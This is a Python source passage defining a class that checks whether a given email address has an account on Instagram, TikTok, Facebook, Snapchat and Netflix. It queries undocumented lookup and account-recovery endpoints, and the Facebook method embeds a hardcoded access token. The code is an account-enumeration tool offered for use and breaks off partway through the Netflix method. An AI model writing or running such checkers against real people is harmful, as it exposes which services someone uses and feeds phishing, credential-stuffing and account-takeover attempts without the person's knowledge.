class RealChecker:
    @staticmethod
    def instagram(email):
        url = "https://www.instagram.com/api/v1/web/accounts/lookup_edit/"
        try:
            with requests.Session() as sess:
                headers = get_headers("insta")
                data = {'email': email}
                res = sess.post(url, headers=headers, data=data, timeout=12)
                if '"status":"ok"' in res.text:
                    return True
                return False
        except:
            return False

    @staticmethod
    def tiktok(email):
        url = f"https://www.tiktok.com/api/v1/check/email/?email={email}&aid=1233"
        try:
            headers = get_headers()
            res = requests.get(url, headers=headers, timeout=10)
            json_res = res.json()
            if json_res.get('is_registered') == 1:
                return True
            return False
        except:
            return False

    @staticmethod
    def facebook(email):
        url = 'https://b-graph.facebook.com/recover_accounts'
        params = {
            'q': email,
            'locale': 'en_US',
            'client_country_code': 'DZ',
            'method': 'GET',
            'fb_api_req_friendly_name': 'accountRecoverySearch',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        try:
            headers = get_headers("fb")
            res = requests.post(url, data=params, headers=headers, timeout=12)
            if "network_info" in res.text or "account_id" in res.text:
                return True
            return False
        except:
            return False
    @staticmethod
    def snapchat(email):
        url = "https://accounts.snapchat.com/accounts/get_email_status"
        try:
            headers = get_headers()
            data = {'email': email}
            res = requests.post(url, data=data, headers=headers, timeout=10)
            if '"exists":true' in res.text:
                return True
            return False
        except:
            return False

    @staticmethod
    def netflix(email):
        url = "https://www.netflix.com/dz-en/login"
        try:
            with requests.Session() as sess:
                res = sess.get(url, headers=get_headers(), timeout=10)
                if email in res.text:
